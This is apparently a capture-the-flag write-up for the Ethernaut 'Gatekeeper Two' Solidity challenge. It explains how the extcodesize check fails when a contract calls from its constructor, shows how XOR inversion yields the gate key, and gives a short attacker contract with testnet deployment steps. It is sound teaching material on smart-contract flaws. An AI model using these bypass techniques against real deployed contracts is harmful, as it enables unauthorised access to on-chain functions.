# Gatekeeper Two

## Objectives

Register as an entrant to pass this level.

## Solution

As with Gatekeeper One, we have to successfully pass 3 modifier checks for the function `enter()` in order to make `entrant` our address.

In my opinion, this problem is significantly easier than Gatekeeper One, as the checks to pass are much easier and faster to code and are found much easier through google searches of concepts with very little reading required.

The checks are as follows:

1. The transaction has to be sent from a contract so that the contract address (`msg.sender`) differs from the contract caller (`tx.origin`).

2. The result of running the solidity assembly opcode `extcodesize()` on the function caller returns how long the caller contract code is, however, when we perform the external call from the constructor of the contract calling, `extcodesize()` returns zero because a contract does not have source code available during construction. [This page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/) from the Consensys smart contract best practices page details it. Thus `extcodesize()` is NOT a reliable way of checking whether the external call is performed by a contract or an externally owned account. All we have to do here is run the code that calls the `enter()` function from the constructor of our calling contract.

3. The bitwise `XOR` and each element operated through it is its own inverse, so if we have that if:

```js
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
```

Is true, then:

```js
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey)
```

is also true. Therefore, _we don't need `_gateKey`_, we can simply pass the result of `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1` as the parameter of `enter()` but casted to `bytes8` as that's what `enter()` calls for.

## How I did it

1. Code an attacker contract where we I define the contract constructor as follows:

```js
constructor(address _instance) public {
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));

    (bool success,) = _instance.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    require(success, "external call failed");
}
```

2. Then simply deploy the contract (at: `0x6961C8C27dC8f153c62815E0EBb0c7bb75d974E1`) and on the constructor run, the `enter()` function is called

```python
gk2attack = GatekeeperTwoAttack.deploy(gatekeeper.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x87105614e9d33bb07ff05662a4c989d5e68dc32e3862c6cccb5c81d1776b8bd6

3. Check that my address is `entrant`

```python
entrant_assertion = gatekeeper.entrant() == acc.address
print(f"Address is entrant: {entrant_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x8c73b0d28f3123100afcacd750d2267bd090faacac152efbb10bd8b6ab39a99a
